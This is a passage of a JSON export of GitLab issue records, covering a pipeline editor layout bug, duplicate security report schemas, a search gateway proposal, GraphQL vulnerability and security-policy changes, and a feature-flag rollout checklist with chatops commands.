Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"user_notes_count":11,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347108","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347108","notes":"https://gitlab.com/api/v4/projects/278964/issues/347108/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347108/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347108","relative":"#347108","full":"gitlab-org/gitlab#347108"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98392557,"iid":347104,"project_id":278964,"title":"The commit confirmation alert can't be closed in the pipeline editor when in fluid layout","description":"## Problem\n\nWhen you commit your config in the Pipeline Editor we show a confirmation alert which needs to be manually removed. \n\nIt's not possible to close the alert when in fluid layout or when the screen space it tight because the close button is hidden under the sidebar.\n\n![image](/uploads/33a46325391d2f71c2f4efb5f58afcec/image.png)\n\n## Proposal\n\nAdjust the layout so the drawer doesn't cover the alert.\n\nIt looks like we need to adjust the right margin for the alert like we did for the main container in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/78038. This should shorten the width of the alert so the close button is visible.","state":"closed","created_at":"2021-12-03T07:05:38.929Z","updated_at":"2022-01-21T18:26:51.891Z","closed_at":"2022-01-21T18:26:51.878Z","closed_by":{"id":5327378,"username":"f_caplette","name":"Frdric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"},"labels":["Category:Pipeline Authoring","Low SUS Score","SUS::Impacting","UX","auto updated","devops::verify","feature::enhancement","frontend","group::pipeline authoring","section::ops","severity::3","usability","workflow::production"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":5327378,"username":"f_caplette","name":"Frdric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"}],"author":{"id":4706959,"username":"nadia_sotnikova","name":"Nadia Sotnikova","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4706959/avatar.png","web_url":"https://gitlab.com/nadia_sotnikova"},"type":"ISSUE","assignee":{"id":5327378,"username":"f_caplette","name":"Frdric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347104","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347104","notes":"https://gitlab.com/api/v4/projects/278964/issues/347104/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347104/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347104","relative":"#347104","full":"gitlab-org/gitlab#347104"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98382617,"iid":347093,"project_id":278964,"title":"Duplicate security report schemas in monolith","description":"### Problem\nCurrently the monolith has schemas for validation in two locations\n\n- https://gitlab.com/gitlab-org/gitlab/-/tree/master/lib/gitlab/ci/parsers/security/validators/schemas\n- https://gitlab.com/gitlab-org/gitlab/-/tree/master/ee/lib/ee/gitlab/ci/parsers/security/validators/schemas\n\nHowever, the publishing from security-report-schemas is only going to the second location. \n\n### Proposal\nDetermine a way that one folder can be used, or duplicate the files in the two locations and update the security reports format publishing job.\n\n### Implementation\n\n1. Change [deploy-to-rails.sh](https://gitlab.com/gitlab-org/security-products/security-report-schemas/-/blob/master/scripts/deploy-to-rails.sh) so that schemas are deployed to both locations\n1. Copy all schemas from ee to core so that the directories are the same\n1. Write a follow-up issue to consolidate schemas in a single directory","state":"closed","created_at":"2021-12-03T01:39:26.261Z","updated_at":"2022-02-18T07:03:41.139Z","closed_at":"2022-02-03T05:17:05.923Z","closed_by":{"id":480804,"username":"thiagocsf","name":"Thiago Figueir","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480804/avatar.png","web_url":"https://gitlab.com/thiagocsf"},"labels":["Deliverable","backend","devops::secure","group::threat insights","section::sec","type::maintenance","workflow::in review"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":480804,"username":"thiagocsf","name":"Thiago Figueir","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480804/avatar.png","web_url":"https://gitlab.com/thiagocsf"}],"author":{"id":4310743,"username":"sethgitlab","name":"Seth Berger","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4310743/avatar.png","web_url":"https://gitlab.com/sethgitlab"},"type":"ISSUE","assignee":{"id":480804,"username":"thiagocsf","name":"Thiago Figueir","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480804/avatar.png","web_url":"https://gitlab.com/thiagocsf"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347093","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347093","notes":"https://gitlab.com/api/v4/projects/278964/issues/347093/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347093/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347093","relative":"#347093","full":"gitlab-org/gitlab#347093"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6968,"epic":{"id":374803,"iid":6968,"title":"Enforce validation of security reports","url":"/groups/gitlab-org/-/epics/6968","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98377708,"iid":347085,"project_id":278964,"title":"Proposal: Search Gateway","description":"### Proposal\n\n1. make a golang **search client** that is capable of doing concurrent search requests (federated search)\n    * example: one request goes to self managed and another goes to gitlab.com\n    * another example: one request goes to elasticsearch cluster and another goes to opensearch cluster\n2. make a \"**Search Gateway**\" that runs alongside rails. It would be a lightweight golang REST API for our **search client**.\n    * for SaaS, the Search Gateway would just send searches to the existing elasticsearch cluster\n\n```\n                     REST API\nRAILS  SEARCH GATEWAY\n                                  DATASTORE\n                                \n                                  \n                  (SEARCH CLIENT)  DATASTORE\n                                  \n                                  \n                                    DATASTORE\n```\n\n\nWhat this could potentially give us (top of mind):\n* federated search\n* decouples us from elasticsearch gem inside rails\n* helps with opensearch/elasticsearch compatability\n\nThings to consider:\n* Adding another \"hop\" between rails and elasticsearch (rails -\u003e search gateway -\u003e elasticsearch) could add some latency, but if the search gateway is co-located with rails the latency add would most likely be minimal.\n* We could consider routing requests  with prefix of `/search` and `/api/v4/search` directly from loadbalancer to search gateway to reduce latency but incur complexity (authentication, etc)\n\ncc @JohnMcGuire","state":"closed","created_at":"2021-12-02T22:16:46.453Z","updated_at":"2022-10-13T17:22:26.221Z","closed_at":"2022-10-13T17:22:26.205Z","closed_by":{"id":5708766,"username":"terrichu","name":"Terri Chu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5708766/avatar.png","web_url":"https://gitlab.com/terrichu"},"labels":["Category:Global Search","advanced search","auto updated","devops::data_stores","group::global search","section::enablement","type::maintenance"],"milestone":null,"assignees":[],"author":{"id":9717668,"username":"john-mason","name":"John Mason","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9717668/avatar.png","web_url":"https://gitlab.com/john-mason"},"type":"ISSUE","assignee":null,"user_notes_count":15,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347085","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":8,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347085","notes":"https://gitlab.com/api/v4/projects/278964/issues/347085/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347085/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347085","relative":"#347085","full":"gitlab-org/gitlab#347085"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6221,"epic":{"id":291947,"iid":6221,"title":"Federated Advanced Global Search for Self-Managed","url":"/groups/gitlab-org/-/epics/6221","group_id":9970,"human_readable_end_date":"May 22, 2023","human_readable_timestamp":"\u003cstrong\u003e4\u003c/strong\u003e months remaining"},"iteration":null,"health_status":null},{"id":98376330,"iid":347081,"project_id":278964,"title":"Add `ClusterImageScanningLocation` to `VulnerabilitiesResolver`","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n\u003c!--\nA brief explanation of the why, not the what or how. Assume the reader doesn't know the\nbackground and won't have time to dig-up information from comment threads.\n--\u003e\n\nAdd a new location type to the `VulnerabilitiesResolver` so that we can return Cluster Image Scanning location data from GraphQL.\n\nSee: https://gitlab.com/groups/gitlab-org/-/epics/6345#note_750077071\n\n## Relevant links\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [ ] Documentation:\n- [ ] Feature flag:\n- [ ] Performance:\n- [ ] Testing:\n\n\n## Implementation plan\n\u003c!--\nSteps and the parts of the code that will need to get updated. The plan can also\ncall-out responsibilities for other team members or teams.\n\ne.g.:\n\n- [ ] ~frontend Step 1\n  - [ ] `@person` Step 1a\n- [ ] ~frontend Step 2\n\n--\u003e\n\n1. Create new `VulnerableKubernetesResourceType` to hold the Kubernetes Resource data\n1. Create new `VulnerabilityLocation::ClusterImageScanningType` which uses `VulnerableKubernetesResourceType`\n1. Add `VulnerabilityLocation::ClusterImageScanningType` to `VulnerabilityLocationType`\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2021-12-02T21:30:39.519Z","updated_at":"2021-12-27T03:19:40.821Z","closed_at":"2021-12-22T03:04:09.192Z","closed_by":{"id":480804,"username":"thiagocsf","name":"Thiago Figueir","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480804/avatar.png","web_url":"https://gitlab.com/thiagocsf"},"labels":["Category:Container Scanning","backend","devops::govern","feature::addition","group::security policies","section::sec","type::feature","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"},{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"}],"author":{"id":8953999,"username":"bwill","name":"Brian Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8953999/avatar.png","web_url":"https://gitlab.com/bwill"},"type":"ISSUE","assignee":{"id":8401507,"username":"sashi_kumar","name":"Sashi Kumar Kumaresan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8401507/avatar.png","web_url":"https://gitlab.com/sashi_kumar"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347081","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":7,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 7 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347081","notes":"https://gitlab.com/api/v4/projects/278964/issues/347081/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347081/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347081","relative":"#347081","full":"gitlab-org/gitlab#347081"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7255,"epic":{"id":402570,"iid":7255,"title":"Project/Agent-level operational vulnerability report filters","url":"/groups/gitlab-org/-/epics/7255","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98374499,"iid":347073,"project_id":278964,"title":"[Feature flag] Rollout of `extract_mr_diff_commit_deletions`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [`extract_mr_diff_commit_deletions`](https://gitlab.com/gitlab-org/gitlab/-/issues/346166) on production,\nthat is currently behind the `\u003cfeature-flag-name\u003e` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::code review\" \n- Most appropriate slack channel to reach out to: `#g_create_code_review`\n- Best individual to reach out to: @kerrizor\n- PM: @phikai \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### When is the feature viable?\n\n\u003c!-- What are the settings we need to configure in order to have this feature viable? --\u003e\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\n\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2021-12-02T20:27:16.441Z","updated_at":"2022-02-08T00:12:13.945Z","closed_at":"2022-02-08T00:12:13.933Z","closed_by":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"labels":["devops::create","feature flag","feature::addition","group::code review","missed:14.6","section::dev","type::feature"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"}],"author":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"type":"ISSUE","assignee":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-02-03","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347073","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":18},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"18 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347073","notes":"https://gitlab.com/api/v4/projects/278964/issues/347073/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347073/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347073","relative":"#347073","full":"gitlab-org/gitlab#347073"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98371172,"iid":347069,"project_id":278964,"title":"Update Security Policy GraphQL mutations to work with group-level policies","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n\u003c!--\nA brief explanation of the why, not the what or how. Assume the reader doesn't know the\nbackground and won't have time to dig-up information from comment threads.\n--\u003e\n\nAs part of the implementation for Group-level security policies (https://gitlab.com/groups/gitlab-org/-/epics/4425), we need to update Security Policy GraphQL mutations to be able to work with Group-level policies (via namespaces https://gitlab.com/groups/gitlab-org/-/epics/6473)\n\n## Relevant links\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [ ] Documentation:\n- [ ] Feature flag:\n- [ ] Performance:\n- [ ] Testing:\n\n\n## Implementation plan\n\u003c!--\nSteps and the parts of the code that will need to get updated. The plan can also\ncall-out responsibilities for other team members or teams.\n\ne.g.:\n\n- [ ] ~frontend Step 1\n  - [ ] `@person` Step 1a\n- [ ] ~frontend Step 2\n\n--\u003e\n\nThe following mutations need to be updated:\n\n- [x] ~backend modify `ee/app/graphql/mutations/security_policy/assign_security_policy_project.rb` to have `argument :namespace_path` or `argument :full_path` (`GraphQL::Types::ID, required: true`), mark `:project_path` argument as deprecated (using `deprecated: { reason: \"\", milestone: \"\" }` param), modify `resolve` method to find namespace instead of project (and fallback to project when namespace is not found), modify `assign_project` method to accept namespace,\n- [x] ~backend modify `::Security::Orchestration::AssignService` (`ee/app/services/security/orchestration/assign_service.rb`) to accept `namespace` instead of `project`,\n\n- [x] ~backend add `ScanExecutionPolicyCommit` to `ee/app/graphql/ee/types/deprecated_mutations.rb` and use `ScanPolicyCommit` instead in `ee/app/graphql/mutations/security_policy/commit_scan_execution_policy.rb` (you can also rename the mutation class to `CommitScanPolicy`),\n- [x] ~backend modify `ee/app/graphql/mutations/security_policy/commit_scan_execution_policy.rb` to have `argument :namespace_path` or `argument :full_path` (`GraphQL::Types::ID, required: true`), mark `:project_path` argument as deprecated (using `deprecated: { reason: \"\", milestone: \"\" }` param), modify `resolve` method to find namespace instead of project (and fallback to project when namespace is not found), modify `commit_policy` method to accept namespace,\n- [x] ~backend modify `::Security::SecurityOrchestrationPolicies::PolicyCommitService` (`ee/app/services/security/security_orchestration_policies/policy_commit_service.rb`) to accept `namespace` instead of `project`,\n\n- [x] ~backend modify `ee/app/graphql/mutations/security_policy/create_security_policy_project.rb` to have `argument :namespace_path` or `argument :full_path` (`GraphQL::Types::ID, required: true`), mark `:project_path` argument as deprecated (using `deprecated: { reason: \"\", milestone: \"\" }` param), modify `resolve` method to find namespace instead of project (and fallback to project when namespace is not found), modify `commit_policy` method to accept namespace,\n- [x] ~backend modify `::Security::SecurityOrchestrationPolicies::ProjectCreateService` (`ee/app/services/security/security_orchestration_policies/project_create_service.rb`) to accept `namespace` instead of `project`, modify `add_members` method to support both `Project` and `Namespace` to get list of team members to add new policy project; modify `create_project_params` method to support both `namespace` and `project` to prepare params to new Project,\n\n- [x] ~backend modify 